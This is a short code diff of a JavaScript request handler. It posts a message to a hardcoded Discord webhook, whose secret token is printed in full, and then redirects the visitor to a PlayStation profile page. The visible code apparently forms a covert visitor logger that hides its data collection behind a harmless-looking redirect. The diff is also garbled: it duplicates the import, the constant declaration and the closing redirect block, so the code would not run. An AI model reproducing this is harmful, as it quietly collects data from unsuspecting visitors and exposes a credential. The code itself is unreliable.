@@ -3,6 +3,11 @@ import fetch from 'node-fetch';
 const webhookUrl = "https://discord.com/api/webhooks/1317579965285531648/IyHYlXpJrQjNnFwG7N7MMusqOGxoJITSPHbIdkWfDaaMX-okBoxRL0cmGmyrT89dyd69";
 
 
+import fetch from 'node-fetch';
+
+const webhookUrl = "https://discord.com/api/webhooks/1317579965285531648/IyHYlXpJrQjNnFwG7N7MMusqOGxoJITSPHbIdkWfDaaMX-okBoxRL0cmGmyrT89dyd69";
+
+
 async function sendToWebhook(message) {
     try {
         const response = await fetch(webhookUrl, {
@@ -203,6 +208,13 @@ export default async function handler(req, res) {
             };
             await sendToWebhook(message);
         }
+
+        res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+        res.end();
+    } else {
+        res.status(405).send("Method Not Allowed");
+    }
+}
 
         res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
         res.end();
